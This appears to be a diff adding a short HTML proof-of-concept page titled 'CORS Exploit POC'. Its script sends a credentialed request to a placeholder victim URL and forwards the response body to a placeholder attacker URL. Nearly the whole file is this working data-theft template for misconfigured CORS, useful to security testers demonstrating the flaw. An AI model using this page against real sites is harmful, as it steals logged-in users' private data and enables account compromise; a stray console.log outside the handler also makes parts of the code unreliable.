@@ -1,0 +1,25 @@
+<html>
+	<head>
+		<title>CORS Exploit POC</title>
+	</head>
+	<body>
+		<h1>CORS Exploit POC</h1>
+		<script>
+			var cors = new XMLHttpRequest();
+			var Victim_url = '<victim_url>';
+			cors.open('GET', Victim_url, true);
+			cors.withCredentials = true;
+			cors.onload = reqListener;
+			cors.send();
+			console.log(this.responseText)
+
+			function reqListener() {
+				var data = new XMLHttpRequest();
+				var attacker_url = '<attack_url>';
+				data.open('GET', attacker_url);
+				data.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+				data.send('responsehtml=' + encodeURIComponent(String(this.responseText)));
+			};
+		</script>
+	</body>
+</html>
